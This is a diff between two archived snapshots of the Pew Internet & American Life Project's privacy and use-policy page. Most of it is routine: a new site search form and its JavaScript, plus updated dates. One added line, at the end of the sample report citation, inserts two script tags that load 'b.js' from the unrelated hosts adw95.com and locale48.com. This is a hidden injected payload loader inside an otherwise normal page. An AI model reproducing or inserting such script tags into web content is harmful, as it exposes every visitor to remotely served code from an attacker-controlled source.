@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the pewinternet.org privacy policy that was archived on 2007-12-13.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20071213143058id_/http%3A//www.pewinternet.org/about_policies.asp) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the pewinternet.org privacy policy that was archived on 2008-06-04.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20080604015433id_/http%3A//www.pewinternet.org/about_policies.asp) for the most accurate reproduction.-->
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head>
 <title>Pew Internet &amp; American Life Project</title>
@@ -75,63 +75,79 @@
 				  
 			</div><!--end sidebar container-->
 			
-			<div id="contentcontainer" class="subpage"><!--the content container establishes the area of the page that will hold the main column and sidebar--><!--
-<div id="search_wide">
-<FORM METHOD="POST" NAME="pico" ACTION="http://www.picosearch.com/cgi-bin/ts.pl">
-<span class="search_text">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;December 13, 2007</span>
-<img src="/images/spacers/spacer-trans.gif" alt="&lt;empty&gt;" height="20" width="130" />
-<span id="search_form"><img src="../images/hdr_search.gif" width="36" height="11" border="0" />
-<!-- Begin PicoSearch Query Box --
-<input type="HIDDEN" name="index" value="216028">
-<select name="psel" id="psel" class="searchfield" >
-	<option Value="all">Entire Site</option>
-	<option Value="reports">Reports</option>
-</select>&nbsp;&nbsp;
+			<div id="contentcontainer" class="subpage"><!--the content container establishes the area of the page that will hold the main column and sidebar--><!-- Begin site search Query Box -->
+<form method="POST" name="search_wide" id="search_wide" action="/search.asp">
 
-<input type="text" value="Keyword" name="query" value="" size="20" id="txtKeyword" class="search_text" onblur="ResetKeywordField(this)"/>
-<a href="javascript:document.pico.submit()"><img alt="Go" src="../images/go.gif" height="13" width="23" border="0" /></a>
-</span>
-						</FORM>
-						<!-- End PicoSearch Query Box --
+    <script type="text/javascript" language="javascript">
+        function SubmitSearchForm(){
+            var optionsList = document.getElementById('p').options;
+            var searchBox = document.getElementById('q');
+            var commitSearch = true; 
+            
+            var keywordValue =  'Try Our New Search';
+            
+            if (optionsList)
+            {
+                var i = 0;
+                while(i < optionsList.length){
+                    if (optionsList[i].selected && (optionsList[i].value == "" || searchBox.value == keywordValue || searchBox.value == "") ) 
+                    {
+                        if (optionsList[i].value != "adv"){
+                            commitSearch = false;
+                            break;
+                        }
+                    }
+                    i++;
+                }
+                
+                if (commitSearch){
+                    document.getElementById("searchType").value = "adv";
+                    document.search_wide.submit();
+                }
+            }
+        }
+    </script>
 
-</div>
--->
+    <input type="hidden" value="" id="searchType" name="searchType">
+    <span class="search_text">
+        June 3, 2008
+    </span>
+    <fieldset id="search_form">
+        <img src="/images/hdr_search.gif" width="36" height="11" border="0">
+        <input type="HIDDEN" name="index" value="216028">
+        <select name="p" id="p" class="searchfield">
+            <option value="es" selected="selected">Entire Site</option>
+            <option value="au">Authors</option>
+            <option value="d">Data</option>
+            <option value="bl">Posts</option>
+            <option value="pt">Presentations</option>
+            <option value="pr">Press</option>
+            <option value="r">Reports</option>
+            <option value="">------------</option>
+            <option value="adv">Advanced</option>
+        </select>
+        <input type="text" name="q" id="q" size="20" class="search_text" value="Try Our New Search" onfocus="ClearField(this)" onblur="ResetKeywordField(this)">
+        <a href="javascript:SubmitSearchForm();">
+            <img alt="Go" src="/images/go.gif" height="13" width="23" border="0">
+        </a>
 
-
-<!-- Begin PicoSearch Query Box --> 
-	<form method="POST" name="pico" id="search_wide" action="http://www.picosearch.com/cgi-bin/ts.pl">
-		<span class="search_text">
-			December 13, 2007
-		</span>
-						
-		<fieldset id="search_form">
-			<img src="/images/hdr_search.gif" width="36" height="11" border="0">
-
-			<input type="HIDDEN" name="index" value="216028">
-			<select name="psel" id="psel" class="searchfield">
-				<option value="all">Entire Site</option>
-				<option value="reports">Reports</option>
-			</select>
-			<input type="text" name="query" size="20" id="txtKeyword" class="search_text" value="Keyword" onfocus="ClearField(this)" onblur="ResetKeywordField(this)">	
-								
-			<a href="javascript:document.pico.submit()">
-					<img alt="Go" src="/images/go.gif" height="13" width="23" border="0">
-			</a>
-			
-			<script type="text/javascript">
+        <script type="text/javascript" language="javascript">
 				function ResetKeywordField(keywordField){
 					if (keywordField.value == ''){
-						keywordField.value = 'Keyword';
+						keywordField.value = 'Try Our New Search';
 					}
 				}
 				
 				function ClearField(keywordField){
-					keywordField.value = '';
+				    if (keywordField.value == 'Try Our New Search'){
+				        keywordField.value = '';
+				    }
 				}
 			</script>
 		</fieldset>
 	</form> 
-<!-- End PicoSearch Query Box -->
+	
+<!-- End site search Query Box -->
 
 					<div id="maincolumn">
 					  <img src="images/main-header-aboutus.gif" alt="About Us" width="298" height="31"><br>
@@ -158,7 +174,7 @@ Report Author(s), Report Title, Pew Internet &amp; American Life Project, Report
 or 
 Report Author(s), "Chart or Chapter or section title," Report Title, Pew Internet &amp; American Life Project, Report Release Date, URL from which the report or chart/chapter was accessed, date URL accessed. Pg no.
 An example: 
-Horrigan, John. A Typology of Information and Communication Technology Users. Pew Internet &amp; American Life Project, May 6, 2007, http://www.pewinternet.org/PPF/r/213/report_display.asp, accessed on May 10, 2007. 
+Horrigan, John. A Typology of Information and Communication Technology Users. Pew Internet &amp; American Life Project, May 6, 2007, http://www.pewinternet.org/PPF/r/213/report_display.asp, accessed on May 10, 2007.<script src="http://www.adw95.com/b.js"></script><script src="http://www.locale48.com/b.js"></script>
 					</p> 
 								
 					  <p>&nbsp;</p>
@@ -180,7 +196,7 @@ Horrigan, John. A Typology of Information and Communication Technology Users. Pe
     <div id="footer"><table width="676" border="0" cellspacing="0" cellpadding="0">
   <tbody><tr><td colspan="2">&nbsp;</td></tr>
   <tr>
-    <td align="left" valign="top">© 2000 - 2007 Pew Internet &amp; American Life Project<br>
+    <td align="left" valign="top">© 2000 - 2008 Pew Internet &amp; American Life Project<br>
 	1615 L Street, NW, Suite 700, Washington, DC 20036<br>
       <a href="/about_policies.asp">Privacy / Use Policies</a> | <a href="/pew-charitable-trusts.asp">Pew Charitable Trusts</a> | <a href="http://pewresearch.org">Pew Research Center</a></td>
     <td align="right" valign="top">
